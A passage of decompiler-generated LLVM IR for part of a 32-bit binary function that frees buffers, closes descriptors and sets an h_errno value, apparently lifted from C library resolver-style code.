  %v6_8056045 = inttoptr i32 %v0_8055f82 to i32*
  store i32 %v3_8056045, i32* %v6_8056045, align 4
  %v1_805604c = call i32 @free(i32 -1)
  store i32 %v1_805604c, i32* %eax.global-to-local, align 4
  %v0_8056051 = load i32, i32* @esp, align 4
  %v1_8056051 = add i32 %v0_8056051, 16
  %v1_8056054 = add i32 %v0_8056051, 260
  %v2_8056054 = inttoptr i32 %v1_8056054 to i32*
  %v3_8056054 = load i32, i32* %v2_8056054, align 4
  store i32 %v3_8056054, i32* %eax.global-to-local, align 4
  %v1_805605b = add i32 %v0_8056051, 136
  %v2_805605b = inttoptr i32 %v1_805605b to i32*
  %v3_805605b = load i32, i32* %v2_805605b, align 4
  %v15_805605b = icmp eq i32 %v3_805605b, %v3_8056054
  %v1_805605f = icmp eq i1 %v15_805605b, false
  br i1 %v1_805605f, label %dec_label_pc_805608d, label %dec_label_pc_8056061

dec_label_pc_8056061:                             ; preds = %dec_label_pc_8056042
  %v0_8056061 = load i32, i32* @edi, align 4
  %v1_8056061 = add i32 %v0_8056061, 16
  %v2_8056061 = inttoptr i32 %v1_8056061 to i32*
  %v3_8056061 = load i32, i32* %v2_8056061, align 4
  store i32 %v3_8056061, i32* %eax.global-to-local, align 4
  %v2_8056064 = add i32 %v0_8056051, 148
  %v3_8056064 = inttoptr i32 %v2_8056064 to i32*
  %v4_8056064 = load i32, i32* %v3_8056064, align 4
  %v15_8056064 = icmp eq i32 %v3_8056061, %v4_8056064
  %v1_805606b = icmp eq i1 %v15_8056064, false
  br i1 %v1_805606b, label %dec_label_pc_8056127, label %dec_label_pc_8056071

dec_label_pc_8056071:                             ; preds = %dec_label_pc_8056061
  %v0_8056071 = load i32, i32* @edx, align 4
  %v2_8056071 = add i32 %v0_8056051, 12
  %v3_8056071 = inttoptr i32 %v2_8056071 to i32*
  store i32 %v0_8056071, i32* %v3_8056071, align 4
  %v0_8056072 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056072 = add i32 %v0_8056051, 8
  %v3_8056072 = inttoptr i32 %v2_8056072 to i32*
  store i32 %v0_8056072, i32* %v3_8056072, align 4
  %v1_8056073 = add i32 %v0_8056051, 152
  %v2_8056073 = inttoptr i32 %v1_8056073 to i32*
  %v3_8056073 = load i32, i32* %v2_8056073, align 4
  %v5_8056073 = add i32 %v0_8056051, 4
  %v6_8056073 = inttoptr i32 %v5_8056073 to i32*
  store i32 %v3_8056073, i32* %v6_8056073, align 4
  %v0_805607a = load i32, i32* %eax.global-to-local, align 4
  %v1_805607a = load i32, i32* @edi, align 4
  %v2_805607a = add i32 %v1_805607a, 36
  %v3_805607a = inttoptr i32 %v2_805607a to i32*
  %v4_805607a = load i32, i32* %v3_805607a, align 4
  %v7_805607a = mul i32 %v4_805607a, %v0_805607a
  store i32 %v7_805607a, i32* %eax.global-to-local, align 4
  %v2_805607e = add i32 %v1_805607a, 28
  %v3_805607e = inttoptr i32 %v2_805607e to i32*
  %v4_805607e = load i32, i32* %v3_805607e, align 4
  %v5_805607e = add i32 %v4_805607e, %v7_805607a
  store i32 %v5_805607e, i32* %eax.global-to-local, align 4
  %v3_8056081 = inttoptr i32 %v0_8056051 to i32*
  store i32 %v5_805607e, i32* %v3_8056081, align 4
  %v5_8056082 = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_8055bc0, i32 %v3_8055c1f)
  store i32 %v5_8056082, i32* %eax.global-to-local, align 4
  %v0_8056087 = load i32, i32* @edi, align 4
  %v1_8056087 = add i32 %v0_8056087, 36
  %v2_8056087 = inttoptr i32 %v1_8056087 to i32*
  %v3_8056087 = load i32, i32* %v2_8056087, align 4
  %v4_8056087 = add i32 %v3_8056087, 1
  store i32 %v4_8056087, i32* %v2_8056087, align 4
  br label %dec_label_pc_805608a

dec_label_pc_805608a:                             ; preds = %dec_label_pc_805600e, %dec_label_pc_8056071
  %v0_805608a = load i32, i32* @esp, align 4
  %v1_805608a = add i32 %v0_805608a, 16
  br label %dec_label_pc_805608d

dec_label_pc_805608d:                             ; preds = %dec_label_pc_8056042, %dec_label_pc_8056034, %dec_label_pc_805608a
  %v1_805608d = phi i32 [ %v1_8056051, %dec_label_pc_8056042 ], [ %v1_805608d.pre, %dec_label_pc_8056034 ], [ %v1_805608a, %dec_label_pc_805608a ]
  %v0_805608d = load i32, i32* @esi, align 4
  %v2_805608d = add i32 %v1_805608d, 52
  %v3_805608d = inttoptr i32 %v2_805608d to i32*
  %v4_805608d = load i32, i32* %v3_805608d, align 4
  %v5_805608d = add i32 %v4_805608d, %v0_805608d
  store i32 %v5_805608d, i32* @esi, align 4
  %v0_8056091 = load i32, i32* @ebx, align 4
  %v1_8056091 = add i32 %v0_8056091, 1
  store i32 %v1_8056091, i32* @ebx, align 4
  %v2_8056092 = add i32 %v1_805608d, 104
  %v3_8056092 = inttoptr i32 %v2_8056092 to i32*
  %v4_8056092 = load i32, i32* %v3_8056092, align 4
  %v5_8056092 = sub i32 %v1_8056091, %v4_8056092
  %v11_8056092 = xor i32 %v4_8056092, %v1_8056091
  %v12_8056092 = xor i32 %v5_8056092, %v1_8056091
  %v13_8056092 = and i32 %v12_8056092, %v11_8056092
  %v14_8056092 = icmp slt i32 %v13_8056092, 0
  %v16_8056092 = icmp slt i32 %v5_8056092, 0
  %v2_8056096 = icmp eq i1 %v16_8056092, %v14_8056092
  br i1 %v2_8056096, label %dec_label_pc_80560a2, label %dec_label_pc_8056098

dec_label_pc_8056098:                             ; preds = %dec_label_pc_8056098.lr.ph, %dec_label_pc_805608d
  %v0_8056098 = phi i32 [ %v0_8056098.pre, %dec_label_pc_8056098.lr.ph ], [ %v5_805608d, %dec_label_pc_805608d ]
  %v0_8055f6e81 = phi i32 [ %v1_8056092.pre, %dec_label_pc_8056098.lr.ph ], [ %v1_805608d, %dec_label_pc_805608d ]
  %v2_8056098 = add i32 %v0_8055f6e81, 16
  %v3_8056098 = inttoptr i32 %v2_8056098 to i32*
  %v4_8056098 = load i32, i32* %v3_8056098, align 4
  %v5_8056098 = sub i32 %v0_8056098, %v4_8056098
  %v11_8056098 = xor i32 %v4_8056098, %v0_8056098
  %v12_8056098 = xor i32 %v5_8056098, %v0_8056098
  %v13_8056098 = and i32 %v12_8056098, %v11_8056098
  %v14_8056098 = icmp slt i32 %v13_8056098, 0
  %v16_8056098 = icmp slt i32 %v5_8056098, 0
  %v2_805609c = icmp eq i1 %v16_8056098, %v14_8056098
  br i1 %v2_805609c, label %dec_label_pc_80560a2, label %dec_label_pc_8055f6e

dec_label_pc_80560a2:                             ; preds = %dec_label_pc_8055f91, %dec_label_pc_8055f62, %dec_label_pc_805608d, %dec_label_pc_8055fe3, %dec_label_pc_8055ff7, %dec_label_pc_8056098, %dec_label_pc_805601a.dec_label_pc_80560a2.loopexit_crit_edge
  %v0_80560a2 = phi i32 [ %v0_80560a2.pre.pre, %dec_label_pc_805601a.dec_label_pc_80560a2.loopexit_crit_edge ], [ %v1_8056092.pre, %dec_label_pc_8055f62 ], [ %v1_805608d, %dec_label_pc_805608d ], [ %v1_8055fdb, %dec_label_pc_8055fe3 ], [ %v1_8055fdb, %dec_label_pc_8055ff7 ], [ %v0_8055f6e81, %dec_label_pc_8056098 ], [ %v1_8055f82, %dec_label_pc_8055f91 ]
  %v1_80560a5 = add i32 %v0_80560a2, 20
  %v2_80560a5 = inttoptr i32 %v1_80560a5 to i32*
  %v3_80560a5 = load i32, i32* %v2_80560a5, align 4
  %v5_80560a5 = add i32 %v0_80560a2, -16
  %v6_80560a5 = inttoptr i32 %v5_80560a5 to i32*
  store i32 %v3_80560a5, i32* %v6_80560a5, align 4
  %v1_80560a9 = call i32 @__libc_close(i32 -1)
  store i32 %v1_80560a9, i32* %eax.global-to-local, align 4
  %v0_80560ae = load i32, i32* @esp, align 4
  %v1_80560b1 = add i32 %v0_80560ae, 272
  %v2_80560b1 = inttoptr i32 %v1_80560b1 to i32*
  %v3_80560b1 = load i32, i32* %v2_80560b1, align 4
  %v4_80560b1 = icmp eq i32 %v3_80560b1, 0
  br i1 %v4_80560b1, label %dec_label_pc_80560c6, label %dec_label_pc_80560bb

dec_label_pc_80560bb:                             ; preds = %dec_label_pc_80560a2
  store i32 %v3_80560b1, i32* %edx.global-to-local, align 4
  %v2_80560c2 = inttoptr i32 %v3_80560b1 to i32*
  store i32 %v2_8055b32, i32* %v2_80560c2, align 4
  %v0_80560d2.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80560d2

dec_label_pc_80560c6:                             ; preds = %dec_label_pc_80560a2
  %v3_80560c9 = inttoptr i32 %v0_80560ae to i32*
  store i32 %v2_8055b32, i32* %v3_80560c9, align 4
  %v1_80560ca = call i32 @free(i32 -1)
  store i32 %v1_80560ca, i32* %eax.global-to-local, align 4
  %v0_80560cf = load i32, i32* @esp, align 4
  %v1_80560cf = add i32 %v0_80560cf, 16
  br label %dec_label_pc_80560d2

dec_label_pc_80560d2:                             ; preds = %dec_label_pc_80560bb, %dec_label_pc_80560c6
  %v0_80560d2 = phi i32 [ %v0_80560d2.pre, %dec_label_pc_80560bb ], [ %v1_80560cf, %dec_label_pc_80560c6 ]
  %v1_80560d5 = add i32 %v0_80560d2, 12
  %v2_80560d5 = inttoptr i32 %v1_80560d5 to i32*
  %v3_80560d5 = load i32, i32* %v2_80560d5, align 4
  %v5_80560d5 = add i32 %v0_80560d2, -16
  %v6_80560d5 = inttoptr i32 %v5_80560d5 to i32*
  store i32 %v3_80560d5, i32* %v6_80560d5, align 4
  %v1_80560d9 = call i32 @free(i32 -1)
  store i32 %v1_80560d9, i32* @eax, align 4
  %v0_80560de = load i32, i32* @esp, align 4
  %v1_80560e1 = add i32 %v0_80560de, 8
  %v2_80560e1 = inttoptr i32 %v1_80560e1 to i32*
  store i32 ptrtoint (i8** @global_var_8061788.558 to i32), i32* %v2_80560e1, align 4
  %v1_80560e6 = add i32 %v0_80560de, 4
  %v2_80560e6 = inttoptr i32 %v1_80560e6 to i32*
  store i32 134563799, i32* %v2_80560e6, align 4
  %v1_80560eb = add i32 %v0_80560de, 200
  store i32 %v1_80560eb, i32* %ebx.global-to-local, align 4
  %v3_80560f2 = inttoptr i32 %v0_80560de to i32*
  store i32 %v1_80560eb, i32* %v3_80560f2, align 4
  %v2_80560f3 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8055bc0)
  store i32 %v2_80560f3, i32* %eax.global-to-local, align 4
  %v0_80560f8 = load i32, i32* @esp, align 4
  %v1_80560f8 = inttoptr i32 %v0_80560f8 to i32*
  store i32 ptrtoint (i8** @global_var_8061788.558 to i32), i32* %v1_80560f8, align 4
  %v1_80560ff = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_80560ff, i32* %eax.global-to-local, align 4
  %v0_8056104 = load i32, i32* @esp, align 4
  %v1_8056104 = add i32 %v0_8056104, 56
  %v2_8056104 = inttoptr i32 %v1_8056104 to i32*
  %v3_8056104 = load i32, i32* %v2_8056104, align 4
  store i32 %v3_8056104, i32* @eax, align 4
  %v1_8056108 = add i32 %v0_8056104, 72
  %v2_8056108 = inttoptr i32 %v1_8056108 to i32*
  %v3_8056108 = load i32, i32* %v2_8056108, align 4
  store i32 %v3_8056108, i32* %edx.global-to-local, align 4
  %v1_805610c = inttoptr i32 %v0_8056104 to i32*
  %v3_805610c = add i32 %v0_8056104, 4
  %v1_805610d = inttoptr i32 %v3_805610c to i32*
  store i32 1, i32* %v1_805610d, align 4
  %v0_8056110 = load i32, i32* @eax, align 4
  %v1_8056110 = sext i32 %v0_8056110 to i64
  store i64 %v1_8056110, i64* @global_var_80617a0.559, align 32
  %v0_8056115 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056115 = trunc i32 %v0_8056115 to i16
  store i16 %v1_8056115, i16* @global_var_805b4e4.560, align 4
  %v0_805611c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805611c, i32* %v1_805610c, align 4
  %v2_805611d = call i32 @__pthread_return_void(i32 -1, i32 %v15_8055bc0)
  store i32 %v2_805611d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805625e

dec_label_pc_8056127:                             ; preds = %dec_label_pc_8056061
  %v1_805612a = inttoptr i32 %v0_8056061 to i32*
  %v2_805612a = load i32, i32* %v1_805612a, align 4
  %v5_805612a = inttoptr i32 %v0_8056051 to i32*
  store i32 %v2_805612a, i32* %v5_805612a, align 4
  %v1_805612c = call i32 @free(i32 -1)
  store i32 %v1_805612c, i32* @eax, align 4
  %v0_8056131 = load i32, i32* @esp, align 4
  %v1_8056131 = add i32 %v0_8056131, 16
  br label %dec_label_pc_8056134

dec_label_pc_8056134:                             ; preds = %dec_label_pc_8055e66, %dec_label_pc_8055f91, %dec_label_pc_8055f89, %dec_label_pc_8055f25, %dec_label_pc_8055eab, %dec_label_pc_8055e87, %dec_label_pc_8056127
  %v1_805613b = phi i32 [ %v1_8055e7b, %dec_label_pc_8055e66 ], [ %v1_8055f82, %dec_label_pc_8055f91 ], [ %v1_8055f82, %dec_label_pc_8055f89 ], [ %v1_8055e9c, %dec_label_pc_8055f25 ], [ %v1_8055e9c, %dec_label_pc_8055eab ], [ %v1_8055e9c, %dec_label_pc_8055e87 ], [ %v1_8056131, %dec_label_pc_8056127 ]
  %v1_8056134 = add i32 %v1_805613b, 51
  %v2_8056134 = inttoptr i32 %v1_8056134 to i8*
  %v3_8056134 = load i8, i8* %v2_8056134, align 1
  %v4_8056134 = icmp eq i8 %v3_8056134, 0
  %v1_8056139 = icmp eq i1 %v4_8056134, false
  br i1 %v1_8056139, label %dec_label_pc_805617f, label %dec_label_pc_805613b

dec_label_pc_805613b:                             ; preds = %dec_label_pc_8056134
  %v0_805613b = load i32, i32* @ecx, align 4
  %v2_805613b = add i32 %v1_805613b, -4
  %v3_805613b = inttoptr i32 %v2_805613b to i32*
  store i32 %v0_805613b, i32* %v3_805613b, align 4
  %v1_805613c = add i32 %v1_805613b, -8
  %v2_805613c = inttoptr i32 %v1_805613c to i32*
  store i32 ptrtoint (i32* @global_var_805b4e8.497 to i32), i32* %v2_805613c, align 4
  %v1_8056141 = add i32 %v1_805613b, -12
  %v2_8056141 = inttoptr i32 %v1_8056141 to i32*
  store i32 134563799, i32* %v2_8056141, align 4
  %v1_8056146 = add i32 %v1_805613b, 184
  store i32 %v1_8056146, i32* @esi, align 4
  %v2_805614d = add i32 %v1_805613b, -16
  %v3_805614d = inttoptr i32 %v2_805614d to i32*
  store i32 %v1_8056146, i32* %v3_805614d, align 4
  %v2_805614e = call i32 @__pthread_return_void(i32 -1, i32 %v15_8055bc0)
  store i32 %v2_805614e, i32* %eax.global-to-local, align 4
  %v0_8056153 = load i32, i32* @esp, align 4
  %v1_8056153 = inttoptr i32 %v0_8056153 to i32*
  store i32 ptrtoint (i32* @global_var_805b4e8.497 to i32), i32* %v1_8056153, align 4
  %v1_805615a = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_805615a, i32* %eax.global-to-local, align 4
  %v0_805615f = load i32, i32* @esp, align 4
  %v1_805615f = inttoptr i32 %v0_805615f to i32*
  %v2_805615f = load i32, i32* %v1_805615f, align 4
  store i32 %v2_805615f, i32* @eax, align 4
  %v3_805615f = add i32 %v0_805615f, 4
  %v1_8056160 = inttoptr i32 %v3_805615f to i32*
  %v2_8056160 = load i32, i32* %v1_8056160, align 4
  store i32 %v2_8056160, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8056160, align 4
  %v0_8056163 = load i32, i32* @esi, align 4
  store i32 %v0_8056163, i32* %v1_805615f, align 4
  %v0_8056164 = load i32, i32* @global_var_8061bd8.561, align 8
  store i32 %v0_8056164, i32* %ebx.global-to-local, align 4
  %v2_805616a = call i32 @__pthread_return_void(i32 -1, i32 %v15_8055bc0)
  store i32 %v2_805616a, i32* %eax.global-to-local, align 4
  %v0_805616f = load i32, i32* @esp, align 4
  %v1_805616f = add i32 %v0_805616f, 16
  %v1_8056172 = add i32 %v0_8056164, -1
  store i32 %v1_8056172, i32* @ebx, align 4
  %v1_8056173 = add i32 %v0_805616f, 52
  %v2_8056173 = inttoptr i32 %v1_8056173 to i32*
  %v3_8056173 = load i32, i32* %v2_8056173, align 4
  %v5_8056173 = sub i32 %v3_8056173, %v1_8056172
  %v11_8056173 = xor i32 %v3_8056173, %v1_8056172
  %v12_8056173 = xor i32 %v5_8056173, %v3_8056173
  %v13_8056173 = and i32 %v12_8056173, %v11_8056173
  %v14_8056173 = icmp slt i32 %v13_8056173, 0
  %v16_8056173 = icmp slt i32 %v5_8056173, 0
  %v2_8056177 = icmp eq i1 %v16_8056173, %v14_8056173
  br i1 %v2_8056177, label %dec_label_pc_805617f, label %dec_label_pc_8056179

dec_label_pc_8056179:                             ; preds = %dec_label_pc_805613b
  %v4_8056179 = add i32 %v3_8056173, 1
  store i32 %v4_8056179, i32* %v2_8056173, align 4
  br label %dec_label_pc_80561a0.backedge

dec_label_pc_805617f:                             ; preds = %dec_label_pc_8055e08, %dec_label_pc_805613b, %dec_label_pc_8056134, %dec_label_pc_8055e1f
  %v1_805618c = phi i32 [ %v1_805616f, %dec_label_pc_805613b ], [ %v1_805613b, %dec_label_pc_8056134 ], [ %v1_8055e5b, %dec_label_pc_8055e1f ], [ %v0_805617f.pre, %dec_label_pc_8055e08 ]
  %v1_805617f = add i32 %v1_805618c, 40
  %v2_805617f = inttoptr i32 %v1_805617f to i32*
  %v3_805617f = load i32, i32* %v2_805617f, align 4
  %v1_8056183 = add i32 %v3_805617f, 1
  store i32 %v1_8056183, i32* %eax.global-to-local, align 4
  %v1_8056184 = ashr i32 %v1_8056183, 31
  store i32 %v1_8056184, i32* %edx.global-to-local, align 4
  %v1_8056185 = add i32 %v1_805618c, 248
  %v2_8056185 = inttoptr i32 %v1_8056185 to i32*
  %v3_8056185 = load i32, i32* %v2_8056185, align 4
  %v5_8056185 = zext i32 %v1_8056183 to i64
  %v7_8056185 = zext i32 %v1_8056184 to i64
  %v8_8056185 = mul nuw i64 %v7_8056185, 4294967296
  %v9_8056185 = or i64 %v8_8056185, %v5_8056185
  %v10_8056185 = zext i32 %v3_8056185 to i64
  %v11_8056185 = sdiv i64 %v9_8056185, %v10_8056185
  %v12_8056185 = trunc i64 %v11_8056185 to i32
  store i32 %v12_8056185, i32* %eax.global-to-local, align 4
  %v13_8056185 = srem i64 %v9_8056185, %v10_8056185
  %v14_8056185 = trunc i64 %v13_8056185 to i32
  store i32 %v14_8056185, i32* %edx.global-to-local, align 4
  store i32 %v14_8056185, i32* %v2_805617f, align 4
  %v1_8056190 = icmp eq i32 %v14_8056185, 0
  %v1_8056192 = icmp eq i1 %v1_8056190, false
  br i1 %v1_8056192, label %dec_label_pc_8056198, label %dec_label_pc_8056194

dec_label_pc_8056194:                             ; preds = %dec_label_pc_805617f
  %v0_8056194 = load i32, i32* @esp, align 4
  %v1_8056194 = add i32 %v0_8056194, 28
  %v2_8056194 = inttoptr i32 %v1_8056194 to i32*
  %v3_8056194 = load i32, i32* %v2_8056194, align 4
  %v4_8056194 = add i32 %v3_8056194, 1
  store i32 %v4_8056194, i32* %v2_8056194, align 4
  br label %dec_label_pc_8056198

dec_label_pc_8056198:                             ; preds = %dec_label_pc_805617f, %dec_label_pc_8056194
  %v0_8056198 = load i32, i32* @esp, align 4
  %v1_8056198 = add i32 %v0_8056198, 36
  %v2_8056198 = inttoptr i32 %v1_8056198 to i32*
  store i32 -1, i32* %v2_8056198, align 4
  br label %dec_label_pc_80561a0.backedge

dec_label_pc_80561a0.backedge:                    ; preds = %dec_label_pc_8056198, %dec_label_pc_8055e16, %dec_label_pc_8055f04, %dec_label_pc_8056179
  %v0_80561a0.pre = load i32, i32* @esp, align 4
  %v1_80561a0 = add i32 %v0_80561a0.pre, 28
  %v2_80561a0 = inttoptr i32 %v1_80561a0 to i32*
  %v3_80561a0 = load i32, i32* %v2_80561a0, align 4
  %tmp120 = icmp ult i32 %v3_80561a0, 3
  br i1 %tmp120, label %dec_label_pc_8055c00, label %dec_label_pc_80561c5

dec_label_pc_80561c5:                             ; preds = %dec_label_pc_8055b7a, %dec_label_pc_8055c16, %dec_label_pc_8055d0a, %dec_label_pc_80561a0.backedge, %entry, %dec_label_pc_8055b54, %dec_label_pc_8055b5c, %dec_label_pc_8055b6a
  %stack_var_-192.0 = phi i16 [ -1, %dec_label_pc_8055b6a ], [ -1, %dec_label_pc_8055b5c ], [ -1, %dec_label_pc_8055b54 ], [ -1, %entry ], [ %v0_8055bc7, %dec_label_pc_80561a0.backedge ], [ %v0_8055bc7, %dec_label_pc_8055d0a ], [ %v0_8055bc7, %dec_label_pc_8055c16 ], [ %v0_8055bc7, %dec_label_pc_8055b7a ]
  %v0_80561c5 = call i32 @__GI___h_errno_location()
  store i32 %v0_80561c5, i32* %eax.global-to-local, align 4
  %v1_80561ca = inttoptr i32 %v0_80561c5 to i32*
  store i32 -1, i32* %v1_80561ca, align 4
  %v0_80561d0 = load i32, i32* @esp, align 4
  %v1_80561d0 = add i32 %v0_80561d0, 44
  %v2_80561d0 = inttoptr i32 %v1_80561d0 to i32*
  %v3_80561d0 = load i32, i32* %v2_80561d0, align 4
  store i32 %v3_80561d0, i32* %eax.global-to-local, align 4
  %v2_80561d4 = add i32 %v0_80561d0, 56
  %v3_80561d4 = inttoptr i32 %v2_80561d4 to i32*
  store i32 %v3_80561d0, i32* %v3_80561d4, align 4
  br label %dec_label_pc_80561d8

dec_label_pc_80561d8:                             ; preds = %dec_label_pc_8055f3d, %dec_label_pc_8055f15, %dec_label_pc_80561c5
  %stack_var_-192.1 = phi i16 [ %stack_var_-192.0, %dec_label_pc_80561c5 ], [ %v0_8055bc7, %dec_label_pc_8055f3d ], [ %v0_8055bc7, %dec_label_pc_8055f15 ]
  %v0_80561d8 = load i32, i32* @esp, align 4
  %v1_80561d8 = add i32 %v0_80561d8, 20
  %v2_80561d8 = inttoptr i32 %v1_80561d8 to i32*
  %v3_80561d8 = load i32, i32* %v2_80561d8, align 4
  %v13_80561d8 = icmp eq i32 %v3_80561d8, -1
  br i1 %v13_80561d8, label %dec_label_pc_80561d8.dec_label_pc_80561ee_crit_edge, label %dec_label_pc_80561df

dec_label_pc_80561d8.dec_label_pc_80561ee_crit_edge: ; preds = %dec_label_pc_80561d8
  %.pre = sext i16 %stack_var_-192.1 to i32
  br label %dec_label_pc_80561ee

dec_label_pc_80561df:                             ; preds = %dec_label_pc_80561d8
  %v3_80561e2 = load i32, i32* %v2_80561d8, align 4
  %v5_80561e2 = add i32 %v0_80561d8, -16
  %v6_80561e2 = inttoptr i32 %v5_80561e2 to i32*
  store i32 %v3_80561e2, i32* %v6_80561e2, align 4
  %v1_80561e6 = sext i16 %stack_var_-192.1 to i32
  %v2_80561e6 = call i32 @__libc_close(i32 %v1_80561e6)
  store i32 %v2_80561e6, i32* %eax.global-to-local, align 4
  %v0_80561eb = load i32, i32* @esp, align 4
  %v1_80561eb = add i32 %v0_80561eb, 16
  br label %dec_label_pc_80561ee

dec_label_pc_80561ee:                             ; preds = %dec_label_pc_80561d8.dec_label_pc_80561ee_crit_edge, %dec_label_pc_80561df
  %v1_80561f5.pre-phi = phi i32 [ %.pre, %dec_label_pc_80561d8.dec_label_pc_80561ee_crit_edge ], [ %v1_80561e6, %dec_label_pc_80561df ]
  %v0_80561ee = phi i32 [ %v0_80561d8, %dec_label_pc_80561d8.dec_label_pc_80561ee_crit_edge ], [ %v1_80561eb, %dec_label_pc_80561df ]
  %v1_80561f1 = add i32 %v0_80561ee, 12
  %v2_80561f1 = inttoptr i32 %v1_80561f1 to i32*
  %v3_80561f1 = load i32, i32* %v2_80561f1, align 4
  %v5_80561f1 = add i32 %v0_80561ee, -16
  %v6_80561f1 = inttoptr i32 %v5_80561f1 to i32*
  store i32 %v3_80561f1, i32* %v6_80561f1, align 4
  %v2_80561f5 = call i32 @free(i32 %v1_80561f5.pre-phi)
  store i32 %v2_80561f5, i32* %eax.global-to-local, align 4
  %v1_80561fa = load i32, i32* @esp, align 4
  %v2_80561fa = inttoptr i32 %v1_80561fa to i32*
  store i32 %v2_8055b32, i32* %v2_80561fa, align 4
  %v2_80561fd = call i32 @free(i32 %v1_80561f5.pre-phi)
  store i32 %v2_80561fd, i32* @eax, align 4
  %v0_8056202 = load i32, i32* @esp, align 4
  %v1_8056205 = add i32 %v0_8056202, 32
  %v2_8056205 = inttoptr i32 %v1_8056205 to i32*
  store i32 -1, i32* %v2_8056205, align 4
  %v0_805620d = load i32, i32* @esp, align 4
  %v1_805620d = add i32 %v0_805620d, 40
  %v2_805620d = inttoptr i32 %v1_805620d to i32*
  %v3_805620d = load i32, i32* %v2_805620d, align 4
  %v13_805620d = icmp eq i32 %v3_805620d, -1
  br i1 %v13_805620d, label %dec_label_pc_8056261, label %dec_label_pc_8056214

dec_label_pc_8056214:                             ; preds = %dec_label_pc_80561ee
  %v0_8056214 = load i32, i32* @ecx, align 4
  %v2_8056214 = add i32 %v0_805620d, -4
  %v3_8056214 = inttoptr i32 %v2_8056214 to i32*
  store i32 %v0_8056214, i32* %v3_8056214, align 4
  %v1_8056215 = add i32 %v0_805620d, -8
  %v2_8056215 = inttoptr i32 %v1_8056215 to i32*
  store i32 ptrtoint (i8** @global_var_8061788.558 to i32), i32* %v2_8056215, align 4
  %v1_805621a = add i32 %v0_805620d, -12
  %v2_805621a = inttoptr i32 %v1_805621a to i32*
  store i32 134563799, i32* %v2_805621a, align 4
  %v1_805621f = add i32 %v0_805620d, 184
  store i32 %v1_805621f, i32* %ebx.global-to-local, align 4
  %v2_8056226 = add i32 %v0_805620d, -16
  %v3_8056226 = inttoptr i32 %v2_8056226 to i32*
  store i32 %v1_805621f, i32* %v3_8056226, align 4
  %v3_8056227 = call i32 @__pthread_return_void(i32 %v1_80561f5.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8056227, i32* %eax.global-to-local, align 4
  %v0_805622c = load i32, i32* @esp, align 4
  %v1_805622c = inttoptr i32 %v0_805622c to i32*
  store i32 ptrtoint (i8** @global_var_8061788.558 to i32), i32* %v1_805622c, align 4
  %v2_8056233 = call i32 @__pthread_return_0(i32 %v1_80561f5.pre-phi)
  store i32 %v2_8056233, i32* %eax.global-to-local, align 4
  %v0_8056238 = load i32, i32* @esp, align 4
  %v1_8056238 = add i32 %v0_8056238, 56
  %v2_8056238 = inttoptr i32 %v1_8056238 to i32*
  %v3_8056238 = load i32, i32* %v2_8056238, align 4
  store i32 %v3_8056238, i32* %edx.global-to-local, align 4
  %v1_805623c = add i32 %v0_8056238, 72
  %v2_805623c = inttoptr i32 %v1_805623c to i32*
  %v3_805623c = load i32, i32* %v2_805623c, align 4
  store i32 %v3_805623c, i32* %eax.global-to-local, align 4
  %v1_8056240 = sext i32 %v3_8056238 to i64
  store i64 %v1_8056240, i64* @global_var_80617a0.559, align 32
  %v1_8056246 = trunc i32 %v3_805623c to i16
  store i16 %v1_8056246, i16* @global_var_805b4e4.560, align 4
  %v1_805624c = inttoptr i32 %v0_8056238 to i32*
  %v2_805624c = load i32, i32* %v1_805624c, align 4
  store i32 %v2_805624c, i32* @eax, align 4
  %v3_805624c = add i32 %v0_8056238, 4
  %v1_805624d = inttoptr i32 %v3_805624c to i32*
  %v2_805624d = load i32, i32* %v1_805624d, align 4
  store i32 %v2_805624d, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_805624d, align 4
  %v0_8056250 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8056250, i32* %v1_805624c, align 4
  %v3_8056251 = call i32 @__pthread_return_void(i32 %v1_80561f5.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8056251, i32* %eax.global-to-local, align 4
  %v0_8056256 = load i32, i32* @esp, align 4
  %v1_8056256 = add i32 %v0_8056256, 32
  %v2_8056256 = inttoptr i32 %v1_8056256 to i32*
  store i32 -1, i32* %v2_8056256, align 4
  br label %dec_label_pc_805625e

dec_label_pc_805625e:                             ; preds = %dec_label_pc_80560d2, %dec_label_pc_8056214
  %v0_805625e = load i32, i32* @esp, align 4
  %v1_805625e = add i32 %v0_805625e, 16
  br label %dec_label_pc_8056261

dec_label_pc_8056261:                             ; preds = %dec_label_pc_80561ee, %dec_label_pc_805625e
  %v0_8056261 = phi i32 [ %v0_805620d, %dec_label_pc_80561ee ], [ %v1_805625e, %dec_label_pc_805625e ]
  %v1_8056261 = add i32 %v0_8056261, 16
  %v2_8056261 = inttoptr i32 %v1_8056261 to i32*
  %v3_8056261 = load i32, i32* %v2_8056261, align 4
  store i32 %v3_8056261, i32* %eax.global-to-local, align 4
  %v1_8056265 = add i32 %v0_8056261, 220
  %v1_805626b = inttoptr i32 %v1_8056265 to i32*
  %v2_805626b = load i32, i32* %v1_805626b, align 4
  store i32 %v2_805626b, i32* @ebx, align 4
  %v3_805626b = add i32 %v0_8056261, 224
  %v1_805626c = inttoptr i32 %v3_805626b to i32*
  %v2_805626c = load i32, i32* %v1_805626c, align 4
  store i32 %v2_805626c, i32* @esi, align 4
  %v3_805626c = add i32 %v0_8056261, 228
  %v1_805626d = inttoptr i32 %v3_805626c to i32*
  %v2_805626d = load i32, i32* %v1_805626d, align 4
  store i32 %v2_805626d, i32* @edi, align 4
  %v3_805626d = add i32 %v0_8056261, 232
  %v1_805626e = inttoptr i32 %v3_805626d to i32*
  %v2_805626e = load i32, i32* %v1_805626e, align 4
  store i32 %v2_805626e, i32* @ebp, align 4
  ret i32 %v3_8056261

; uselistorder directives
  uselistorder i32 %v0_8056261, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8056238, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805620d, { 0, 5, 4, 3, 2, 1, 6 }
